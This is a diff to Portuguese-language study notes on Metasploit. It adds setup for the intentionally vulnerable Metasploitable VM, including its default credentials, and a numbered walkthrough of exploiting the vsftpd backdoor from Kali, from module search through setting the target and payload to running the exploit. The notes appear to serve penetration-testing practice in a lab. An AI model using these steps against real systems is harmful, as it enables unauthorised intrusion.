@@ -18,7 +18,20 @@ Ferramentas Metasploit:
 
 Payloads: São os pacotes enviados
 
+Execute na VM o Metasploitable:
+  Esse Meta é importante para fazer teste de invasao na propria maquina.
+  Criamos um arquivo no VM: echo texto > arquivo.txt
+  Para saber o IP da VM: Command: ip addr
+  Login: msfadmin
+  Senha: msfadmin
+
 No Kali:
   1) Execute o Metasploit;
   2) command: search vsftpd;
   3) command: use + diretorio do backdoor que foi mostrado no comando anterior;
+  4) command: show options;
+  5) command: set rhosts + ip do alvo;
+  6) command: show payloads
+  7) command: set payloads + nome do arquivo encontrado no command 6
+  8) command: show options; //Veja que agora esta definido o ip.
+  9) command: exploit
